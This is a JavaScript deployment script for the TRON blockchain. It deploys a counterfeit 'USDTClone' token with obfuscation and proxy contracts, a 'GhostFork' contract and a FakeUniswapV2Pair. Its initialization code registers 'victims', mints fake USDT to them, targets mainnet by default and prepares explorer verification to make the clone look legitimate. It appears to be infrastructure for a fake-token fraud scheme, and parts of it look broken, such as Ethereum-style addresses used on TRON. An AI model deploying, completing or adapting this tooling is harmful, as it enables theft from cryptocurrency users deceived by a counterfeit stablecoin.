const TronWeb = require('tronweb');
const fs = require('fs');
const path = require('path');

/**
 * Deployment Script - Deploys all contracts in the correct order
 * Handles contract verification and initialization
 */

class Deployer {
    constructor(config) {
        this.config = config;
        this.tronWeb = new TronWeb({
            fullHost: config.fullNode,
            privateKey: config.privateKey
        });
        
        this.deployedContracts = {};
        this.verificationData = {};
    }
    
    /**
     * Load compiled contract
     */
    loadContract(contractName) {
        const contractPath = path.join(__dirname, '..', 'build', 'contracts', `${contractName}.json`);
        
        if (!fs.existsSync(contractPath)) {
            throw new Error(`Contract ${contractName} not found. Please compile first.`);
        }
        
        const contractData = JSON.parse(fs.readFileSync(contractPath, 'utf8'));
        return {
            abi: contractData.abi,
            bytecode: contractData.bytecode
        };
    }
    
    /**
     * Deploy contract
     */
    async deployContract(contractName, constructorParams = []) {
        console.log(`\n📦 Deploying ${contractName}...`);
        
        try {
            const contract = this.loadContract(contractName);
            
            const options = {
                abi: contract.abi,
                bytecode: contract.bytecode,
                feeLimit: 1000000000, // 1000 TRX
                callValue: 0,
                userFeePercentage: 100,
                originEnergyLimit: 10000000,
                parameters: constructorParams
            };
            
            const deployedContract = await this.tronWeb.contract().new(options);
            
            this.deployedContracts[contractName] = {
                address: deployedContract.address,
                txHash: deployedContract.transactionHash,
                instance: deployedContract
            };
            
            console.log(`✅ ${contractName} deployed at: ${deployedContract.address}`);
            console.log(`   Transaction: ${deployedContract.transactionHash}`);
            
            // Store verification data
            this.verificationData[contractName] = {
                address: deployedContract.address,
                constructorParams: constructorParams,
                timestamp: Date.now()
            };
            
            return deployedContract;
            
        } catch (error) {
            console.error(`❌ Failed to deploy ${contractName}:`, error);
            throw error;
        }
    }
    
    /**
     * Deploy all contracts in order
     */
    async deployAll() {
        console.log('🚀 Starting full deployment...\n');
        
        // 1. Deploy libraries
        console.log('📚 Deploying libraries...');
        await this.deployLibraries();
        
        // 2. Deploy core contracts
        console.log('\n🏗️  Deploying core contracts...');
        await this.deployCoreContracts();
        
        // 3. Deploy auxiliary contracts
        console.log('\n🔧 Deploying auxiliary contracts...');
        await this.deployAuxiliaryContracts();
        
        // 4. Initialize contracts
        console.log('\n⚙️  Initializing contracts...');
        await this.initializeContracts();
        
        // 5. Verify deployment
        console.log('\n✔️  Verifying deployment...');
        await this.verifyDeployment();
        
        // 6. Save deployment data
        await this.saveDeploymentData();
        
        console.log('\n✅ Deployment complete!');
        this.printDeploymentSummary();
    }
    
    /**
     * Deploy libraries
     */
    async deployLibraries() {
        // Libraries are typically embedded in contracts during compilation
        // If standalone libraries needed, deploy here
        console.log('✅ Libraries embedded in contracts');
    }
    
    /**
     * Deploy core contracts
     */
    async deployCoreContracts() {
        // 1. Deploy USDTClone
        const usdtClone = await this.deployContract('USDTClone');
        
        // 2. Deploy QuantumStateManager
        const quantumState = await this.deployContract('QuantumStateManager');
        
        // 3. Deploy AIObfuscator
        const aiObfuscator = await this.deployContract('AIObfuscator');
        
        // 4. Deploy ProxyMesh
        const proxyMesh = await this.deployContract('ProxyMesh');
        
        // 5. Deploy GhostFork
        const ghostFork = await this.deployContract('GhostFork');
        
        // 6. Deploy ZKUpgrader
        const zkUpgrader = await this.deployContract('ZKUpgrader');
    }
    
    /**
     * Deploy auxiliary contracts
     */
    async deployAuxiliaryContracts() {
        // Deploy FakeUniswapV2Pair with token addresses
        const usdtAddress = this.deployedContracts['USDTClone'].address;
        const trxAddress = 'T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb'; // WTRX address
        
        const fakePair = await this.deployContract('FakeUniswapV2Pair', [
            usdtAddress,
            trxAddress
        ]);
    }
    
    /**
     * Initialize contracts
     */
    async initializeContracts() {
        // 1. Connect USDTClone to auxiliary contracts
        const usdtClone = this.deployedContracts['USDTClone'].instance;
        
        console.log('🔗 Connecting USDTClone to auxiliary contracts...');
        
        await usdtClone.setQuantumStateManager(
            this.deployedContracts['QuantumStateManager'].address
        ).send({
            feeLimit: 100_000_000
        });
        
        await usdtClone.setAIObfuscator(
            this.deployedContracts['AIObfuscator'].address
        ).send({
            feeLimit: 100_000_000
        });
        
        await usdtClone.setProxyMesh(
            this.deployedContracts['ProxyMesh'].address
        ).send({
            feeLimit: 100_000_000
        });
        
        await usdtClone.setGhostFork(
            this.deployedContracts['GhostFork'].address
        ).send({
            feeLimit: 100_000_000
        });
        
        console.log('✅ Auxiliary contracts connected');
        
        // 2. Initialize ProxyMesh
        const proxyMesh = this.deployedContracts['ProxyMesh'].instance;
        
        console.log('🔗 Initializing ProxyMesh...');
        
        await proxyMesh.initialize(
            this.deployedContracts['USDTClone'].address,
            {
                maxDepth: 5,
                maxNeighbors: 3,
                randomSeed: Date.now(),
                dynamicRouting: true,
                entropyInjection: true
            }
        ).send({
            feeLimit: 100_000_000
        });
        
        console.log('✅ ProxyMesh initialized');
        
        // 3. Authorize GhostFork caller
        const ghostFork = this.deployedContracts['GhostFork'].instance;
        
        await ghostFork.authorizeCaller(
            this.deployedContracts['USDTClone'].address,
            true
        ).send({
            feeLimit: 100_000_000
        });
        
        console.log('✅ GhostFork authorized');
        
        // 4. Set up initial victims for testing
        if (this.config.testMode) {
            await this.setupTestVictims();
        }
    }
    
    /**
     * Setup test victims
     */
    async setupTestVictims() {
        console.log('🧪 Setting up test victims...');
        
        const usdtClone = this.deployedContracts['USDTClone'].instance;
        
        // Add test victims
        const testVictims = [
            '0x1234567890123456789012345678901234567890',
            '0x2345678901234567890123456789012345678901',
            '0x3456789012345678901234567890123456789012'
        ];
        
        for (const victim of testVictims) {
            await usdtClone.addVictim(victim, true).send({
                feeLimit: 100_000_000
            });
            
            // Mint some tokens for testing
            await usdtClone.mint(victim, '1000000000000').send({ // 1M USDT
                feeLimit: 100_000_000
            });
        }
        
        console.log('✅ Test victims configured');
    }
    
    /**
     * Verify deployment
     */
    async verifyDeployment() {
        console.log('🔍 Verifying contract deployment...');
        
        // Check USDTClone
        const usdtClone = this.deployedContracts['USDTClone'].instance;
        
        const name = await usdtClone.name().call();
        const symbol = await usdtClone.symbol().call();
        const decimals = await usdtClone.decimals().call();
        
        console.log(`   USDT Clone: ${name} (${symbol}) - ${decimals} decimals`);
        
        // Check connections
        const quantumManager = await usdtClone._quantumStateManager().call();
        console.log(`   Quantum Manager: ${quantumManager ? '✅' : '❌'}`);
        
        // Check FakePair
        const fakePair = this.deployedContracts['FakeUniswapV2Pair'].instance;
        const reserves = await fakePair.getReserves().call();
        console.log(`   Fake Pair Reserves: ${reserves._reserve0} / ${reserves._reserve1}`);
        
        console.log('✅ Deployment verified');
    }
    
    /**
     * Save deployment data
     */
    async saveDeploymentData() {
        const deploymentData = {
            network: this.config.network,
            timestamp: Date.now(),
            deployer: this.tronWeb.defaultAddress.base58,
            contracts: {}
        };
        
        for (const [name, data] of Object.entries(this.deployedContracts)) {
            deploymentData.contracts[name] = {
                address: data.address,
                txHash: data.txHash,
                verification: this.verificationData[name]
            };
        }
        
        const outputPath = path.join(__dirname, '..', 'deployment.json');
        fs.writeFileSync(outputPath, JSON.stringify(deploymentData, null, 2));
        
        console.log(`\n💾 Deployment data saved to: ${outputPath}`);
    }
    
    /**
     * Print deployment summary
     */
    printDeploymentSummary() {
        console.log('\n📋 DEPLOYMENT SUMMARY');
        console.log('====================');
        
        for (const [name, data] of Object.entries(this.deployedContracts)) {
            console.log(`\n${name}:`);
            console.log(`   Address: ${data.address}`);
            console.log(`   Tx Hash: ${data.txHash}`);
        }
        
        console.log('\n🔐 IMPORTANT: Save these addresses!');
        console.log(`   USDT Clone: ${this.deployedContracts['USDTClone'].address}`);
        console.log(`   Fake Pair: ${this.deployedContracts['FakeUniswapV2Pair'].address}`);
        console.log(`   Ghost Fork: ${this.deployedContracts['GhostFork'].address}`);
    }
    
    /**
     * Verify on TronScan
     */
    async verifyOnTronScan(contractName) {
        console.log(`\n📝 Preparing ${contractName} for TronScan verification...`);
        
        const contract = this.deployedContracts[contractName];
        const verification = this.verificationData[contractName];
        
        // Generate verification command
        const verifyCommand = `
tronbox verify ${contractName} \\
    --address ${contract.address} \\
    --network ${this.config.network} \\
    --license UNLICENSED \\
    --optimizer true \\
    --optimizer-runs 200
        `.trim();
        
        console.log('Run this command to verify:');
        console.log(verifyCommand);
        
        // Save verification data
        const verifyPath = path.join(__dirname, '..', 'verify', `${contractName}.json`);
        fs.mkdirSync(path.dirname(verifyPath), { recursive: true });
        fs.writeFileSync(verifyPath, JSON.stringify({
            contract: contractName,
            address: contract.address,
            constructorArgs: verification.constructorParams,
            command: verifyCommand
        }, null, 2));
    }
}

// Deployment configuration
const deployConfig = {
    fullNode: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
    privateKey: process.env.DEPLOYER_PRIVATE_KEY || '',
    network: process.env.NETWORK || 'mainnet',
    testMode: process.env.TEST_MODE === 'true'
};

// Main deployment
async function main() {
    console.log('🚀 USDT Clone Deployment Script');
    console.log('==============================\n');
    
    // Validate configuration
    if (!deployConfig.privateKey) {
        console.error('❌ DEPLOYER_PRIVATE_KEY not set');
        process.exit(1);
    }
    
    const deployer = new Deployer(deployConfig);
    
    try {
        // Deploy all contracts
        await deployer.deployAll();
        
        // Prepare verification
        if (process.env.VERIFY === 'true') {
            await deployer.verifyOnTronScan('USDTClone');
            await deployer.verifyOnTronScan('FakeUniswapV2Pair');
        }
        
    } catch (error) {
        console.error('\n❌ Deployment failed:', error);
        process.exit(1);
    }
}

// Run deployment
if (require.main === module) {
    main();
}

module.exports = Deployer;